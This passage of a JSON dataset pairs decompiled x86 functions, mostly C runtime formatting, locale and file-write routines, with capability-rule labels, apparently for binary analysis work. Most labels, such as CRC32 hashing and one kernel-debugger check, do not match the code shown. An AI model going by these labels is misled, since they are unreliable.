0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.004057e0(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 1;\n    if (iVar1 == 8) {\n        fcn.0040687f(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.0040222a(uVar3, arg_8h, arg_ch);\n    }\n    piVar4 = *(in_ECX + 0x20) >> 7;\n    if (((piVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (piVar4 = *(in_ECX + 0x34),  *piVar4 != 0x30)))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 1120
    },
    "004015a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015a0(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00405880(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "004015c3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004015c3(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    int32_t *var_4h;\n    \n    if (*0x57004c == 0) {\n        if (arg_8h + 1U < 0x101) {\n            return *(*0x56ce78 + arg_8h * 2) & 1;\n        }\n    }\n    else {\n        arg_8h_00 = fcn.00404331();\n        var_4h = *(arg_8h_00 + 0x4c);\n        fcn.004043d1(arg_8h_00, &var_4h);\n        if (arg_8h + 1U < 0x101) {\n            return *(*var_4h + arg_8h * 2) & 1;\n        }\n        if (1 < var_4h[1]) {\n            uVar1 = fcn.00404287(arg_8h, 1, 0);\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 258
    },
    "0046bcd1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bcd1(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0046bc09": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bc09(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Mpunct_wchar_t_.0;\n    fcn.00405e1b();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0047e24e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e24e(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00404d77();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00401708": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401708(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) == 0) || (*(*in_ECX + 4) != 0)) {\n        uVar1 = fcn.004042cd(arg_8h, *in_ECX);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 != -1;\n    }\n    else {\n        uVar1 = CONCAT31(*in_ECX >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 151
    },
    "00401979": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00401979(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    if ((arg_8h & 4) != 0) {\n        return 1;\n    }\n    if ((arg_8h & 1) == 0) {\n        return 0;\n    }\n    if ((arg_8h & 2) == 0) {\n        if (arg_ch < 0x80000000) {\n            return 0;\n        }\n    }\n    else if (arg_ch < 0x80000001) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 138
    },
    "00401a5f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401a5f(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00404ba6(8, 0);\n    return;\n}\n",
        "token_count": 93
    },
    "0047e1dc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e1dc(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Mpunct_char_.0;\n    fcn.004029a5();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00401af5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00401af5(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x0049f2ef:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x0049f2f3:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x0049f2f6:\n            cVar5 = fcn.00404ba6(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0049f29b:\n                arg_8h_00 = 0x10;\n                goto code_r0x0049f2f6;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x0049f2af;\n                if (uVar7 < 0x45) goto code_r0x0049f47f;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x0049f47f;\n                    goto code_r0x0049f283;\n                }\n            }\ncode_r0x0049f2ff:\n            cVar5 = fcn.00401e3d();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.00402d60();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x0049f2ff;\n            if (uVar7 != 99) goto code_r0x0049f47f;\ncode_r0x0049f2af:\n            cVar5 = fcn.00404e80(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.00403f49();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x0049f2ff;\n            if (uVar7 == 0x69) goto code_r0x0049f2ef;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.0040547f();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x0049f47f;\n                cVar5 = fcn.00401a5f();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x0049f47f;\n                arg_ch_00 = 0;\n                goto code_r0x0049f29b;\n            }\n            goto code_r0x0049f2f3;\n        }\ncode_r0x0049f283:\n        cVar5 = fcn.004011ae();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x0049f47f;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x0049f38a;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049f38a:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.00404043(&var_ch, arg_ch, param_1 + 0x18, param_1 + 0xc);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00405afb(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.004060a0(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x0049f47f:\n    fcn.00403085(unaff_ESI);\n    return;\n}\n",
        "token_count": 1752
    },
    "00401ca8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00401ca8(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    \n    while( true ) {\n        uVar2 = 0;\n        if (**0x56f458 == 0x5f) {\n            *0x56f458 = *0x56f458 + 1;\n            uVar2 = 0x4000;\n        }\n        uVar1 = **0x56f458;\n        if (('@' < uVar1) && (uVar1 < '[')) {\n            uVar3 = uVar2 | 0x8000;\n            uVar4 = **0x56f458 - 0x41;\n            *0x56f458 = *0x56f458 + 1;\n            if ((uVar4 & 1) != 0) {\n                uVar3 = uVar2 | 0xa000;\n            }\n            if (0x17 < uVar4) {\n                return uVar3;\n            }\n            uVar2 = uVar3 | 0x800;\n            uVar6 = uVar4 & 0x18;\n            if (uVar6 == 0) {\n                uVar2 = uVar3 | 0x840;\n            }\n            else if (uVar6 == 8) {\n                uVar2 = uVar3 | 0x880;\n            }\n            else if (uVar6 != 0x10) {\n                return 0xffff;\n            }\n            uVar4 = uVar4 & 6;\n            if (uVar4 != 0) {\n                if (uVar4 == 2) {\n                    return uVar2 | 0x200;\n                }\n                if (uVar4 != 4) {\n                    if (uVar4 != 6) {\n                        return 0xffff;\n                    }\n                    return uVar2 | 0x400;\n                }\n                return uVar2 | 0x100;\n            }\n            return uVar2;\n        }\n        if (uVar1 != 0x24) {\n            if (('/' < uVar1) && (uVar1 < '9')) {\n                *0x56f458 = *0x56f458 + 1;\n    // switch table (9 cases) at 0x490a23\n                switch(uVar1) {\n                case 0x30:\n                    return 0x800;\n                case 0x31:\n                    return 0x1000;\n                case 0x32:\n                    return 0;\n                case 0x33:\n                    return 0x4000;\n                case 0x34:\n                    return 0x2000;\n                case 0x35:\n                    return 0x6000;\n                case 0x36:\n                    return 0x6800;\n                case 0x37:\n                    return 0x7000;\n                case 0x38:\n                    return 0x7800;\n                default:\n                    return 0xffff;\n                }\n            }\n            if (uVar1 == 0x39) {\n                *0x56f458 = *0x56f458 + 1;\n                return 0xfffd;\n            }\n            if (uVar1 != 0x3b) {\n                return (uVar1 != 0) + 0xfffe;\n            }\n            *0x56f458 = *0x56f458 + 1;\n            return 0x6c00;\n        }\n        puVar5 = *0x56f458 + 1;\n        uVar1 = *puVar5;\n        if ('5' < uVar1) break;\n        iVar7 = 0;\n        if (uVar1 == 0x35) goto code_r0x00490904;\n        if (uVar1 == 0) {\n            uVar4 = 0xfffe;\n            puVar5 = *0x56f458;\n            goto code_r0x0049097d;\n        }\n        if (uVar1 != 0x24) {\n            if ((((uVar1 != 0x30) && (uVar1 != 0x31)) && (uVar1 != 0x32)) && ((uVar1 != 0x33 && (uVar1 != 0x34)))) {\n                *0x56f458 = puVar5;\n                return 0xffff;\n            }\n            goto code_r0x00490904;\n        }\n        if ((*0x56f458)[2] == 0x50) {\n            puVar5 = *0x56f458 + 2;\n        }\n        *0x56f458 = puVar5 + 1;\n        uVar1 = **0x56f458;\n        if (uVar1 < 'N') {\n            if (uVar1 != 0x4d) {\n                if (uVar1 == 0) {\n                    return 0xfffe;\n                }\n                if ((uVar1 != 0x46) && (uVar1 != 0x48)) {\n                    if (uVar1 == 0x4a) goto code_r0x00490858;\n                    if (uVar1 != 0x4c) {\n                        return 0xffff;\n                    }\n                }\n            }\n        }\n        else {\n            if ((uVar1 == 0x4e) || (uVar1 == 0x4f)) {\ncode_r0x00490858:\n                puVar5 = puVar5 + 2;\n                uVar1 = *puVar5;\n                if (('/' < uVar1) && (uVar1 < ':')) {\n                    *0x56f458 = puVar5 + uVar1 + -0x2f;\n                    uVar2 = fcn.00401ca8();\n                    return uVar2 | 0x10000;\n                }\n                uVar4 = 0xffff;\n                goto code_r0x0049097d;\n            }\n            if (uVar1 != 0x51) {\n                if (uVar1 != 0x68) {\n                    return 0xffff;\n                }\n                *0x56f46c = 0;\n            }\n        }\n        *0x56f458 = puVar5 + 2;\n    }\n    if (uVar1 == 0x41) {\n        uVar4 = uVar2 | 0x9000;\n        goto code_r0x0049097d;\n    }\n    if (uVar1 == 0x42) {\n        uVar4 = uVar2 | 0x9800;\n        goto code_r0x0049097d;\n    }\n    if (uVar1 == 0x43) {\n        uVar4 = 0x7c00;\n        goto code_r0x0049097d;\n    }\n    if (uVar1 == 0x44) {\n        uVar4 = uVar2 | 0x9100;\n        goto code_r0x0049097d;\n    }\n    if (uVar1 == 0x45) {\n        uVar4 = uVar2 | 0x9200;\n        goto code_r0x0049097d;\n    }\n    if (uVar1 != 0x52) {\n        *0x56f458 = puVar5;\n        return 0xffff;\n    }\n    puVar5 = *0x56f458 + 2;\n    uVar1 = *puVar5;\n    if ((uVar1 < '0') || (iVar7 = 1,  '5' < uVar1)) {\n        *0x56f458 = puVar5;\n        return (uVar1 == 0) + 0xfffe;\n    }\ncode_r0x00490904:\n    *0x56f458 = puVar5;\n    uVar2 = (iVar7 + 5) * 0x100 | uVar2;\n    uVar4 = uVar2 | 0x8800;\n    if ((**0x56f458 & 1) != 0) {\n        uVar4 = uVar2 | 0xa800;\n    }\n    uVar1 = **0x56f458 & 6;\n    puVar5 = *0x56f458;\n    if (uVar1 == 0) {\n        uVar4 = uVar4 | 0x40;\n    }\n    else if (uVar1 == 2) {\n        uVar4 = uVar4 | 0x80;\n    }\n    else if (uVar1 != 4) {\n        return 0xffff;\n    }\ncode_r0x0049097d:\n    *0x56f458 = puVar5 + 1;\n    return uVar4;\n}\n",
        "token_count": 1950
    },
    "0046bd27": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bd27(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::numpunct_unsigned_short_int_.0;\n    fcn.00406352();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00401cda": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401cda(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x3c;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(0x18, uVar4);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            uVar4 = fcn.0040465b(uVar4);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar2 = vtable.std::numpunct_unsigned_short_int_.0;\n            fcn.00405cae(uVar4, 1);\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 411
    },
    "00462a99": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462a99(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.0040439f();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00463fbe": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463fbe(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "00401dc0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401dc0(uint32_t arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t var_28h;\n    uint lpNumberOfBytesWritten;\n    uint uStack36;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    char *lpBuffer;\n    int32_t var_8h;\n    uint32_t nNumberOfBytesToWrite;\n    \n    nNumberOfBytesToWrite = arg_10h;\n    lpBuffer = arg_ch;\n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_ch == NULL) {\ncode_r0x004cf90f:\n        puVar3 = fcn.0040185c();\n        *puVar3 = 0;\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        fcn.00403751();\n        return -1;\n    }\n    var_10h = arg_8h >> 6;\n    var_8h = (arg_8h & 0x3f) * 0x38;\n    iVar5 = *(var_10h * 4 + 0x570220);\n    cVar1 = *(iVar5 + 0x29 + var_8h);\n    if (((cVar1 == '\\x02') || (cVar1 == '\\x01')) && ((~arg_10h & 1) == 0)) goto code_r0x004cf90f;\n    if ((*(iVar5 + 0x28 + var_8h) & 0x20) != 0) {\n        fcn.0040193d(arg_8h, 0, 0, 2);\n    }\n    cVar2 = fcn.004cf367(arg_8h);\n    if (cVar2 == '\\0') {\n        iVar5 = *(var_10h * 4 + 0x570220);\n        if (*(iVar5 + 0x28 + var_8h) < '\\0') {\n            if (cVar1 == '\\0') {\n                piVar4 = fcn.004cf3f4(&var_28h, arg_8h, arg_ch, nNumberOfBytesToWrite);\n            }\n            else if (cVar1 == '\\x01') {\n                piVar4 = fcn.004cf628(&var_28h, arg_8h, arg_ch, nNumberOfBytesToWrite);\n            }\n            else {\n                if (cVar1 != '\\x02') goto code_r0x004cfa86;\n                piVar4 = fcn.004cf505(&var_28h, arg_8h, arg_ch, nNumberOfBytesToWrite);\n            }\n        }\n        else {\n            var_28h = 0;\n            lpNumberOfBytesWritten = 0;\n            uStack36 = 0;\n            iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                              (*(iVar5 + 0x18 + var_8h), lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n            if (iVar5 == 0) {\n                var_28h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            piVar4 = &var_28h;\n        }\n    }\n    else if (cVar1 == '\\0') {\n        piVar4 = fcn.004cee4e(&var_28h, arg_8h, arg_ch, nNumberOfBytesToWrite);\n    }\n    else {\n        if (1 < cVar1 - 1U) goto code_r0x004cfa86;\n        piVar4 = fcn.004cf2e5(&var_28h, arg_ch, nNumberOfBytesToWrite);\n    }\n    var_1ch = *piVar4;\n    var_18h = piVar4[1];\n    var_14h = piVar4[2];\n    if (var_18h != 0) {\n        return var_18h - var_14h;\n    }\n    arg_ch = lpBuffer;\n    if (var_1ch != 0) {\n        if (var_1ch == 5) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 9;\n            puVar3 = fcn.0040185c();\n            *puVar3 = 5;\n            return -1;\n        }\n        fcn.00404b01(var_1ch);\n        return -1;\n    }\ncode_r0x004cfa86:\n    if (((*(*(var_10h * 4 + 0x570220) + 0x28 + var_8h) & 0x40) != 0) && (*arg_ch == '\\x1a')) {\n        return 0;\n    }\n    puVar3 = fcn.004039a4();\n    *puVar3 = 0x1c;\n    puVar3 = fcn.0040185c();\n    *puVar3 = 0;\n    return -1;\n}\n",
        "token_count": 1169
    },
    "00401df2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401df2(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402739(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.004039a4();\n                *puVar2 = 0x16;\n                uVar3 = fcn.00403751();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a3776;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a3776;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a3776:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.00404bb5(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 0;\n    if (iVar1 == 8) {\n        fcn.00404fe3(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00406726(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1114
    },
    "00401e15": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401e15(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00401587(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "00401e3d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401e3d(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar7;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar7 = param_1[10];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[10] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar7 = 0,  *(param_1 + 0x32) == 0x47)))) {\n        param_1[10] = 1;\n        iVar7 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar3 = fcn.00404bb5(iVar7 + 0x15d);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.00405911();\n        param_1[10] = iVar7 + -0x15d;\n    }\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar4;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.00405911();\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    iVar7 = *(param_1 + 0x32);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.004030f8();\n    arg_10h = fcn.00405911();\n    fcn.00404156(&var_8h, puVar4, arg_10h, arg_14h, arg_18h, iVar7, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.0040229d(param_1[0xd], param_1[2]);\n    }\n    uVar2 = *(param_1 + 0x32);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[8] >> 5,  (uVar5 & 1) == 0)) {\n        uVar5 = fcn.00405b23(param_1[0xd], param_1[2]);\n    }\n    pcVar6 = param_1[0xd];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xd] = pcVar6;\n        cVar3 = 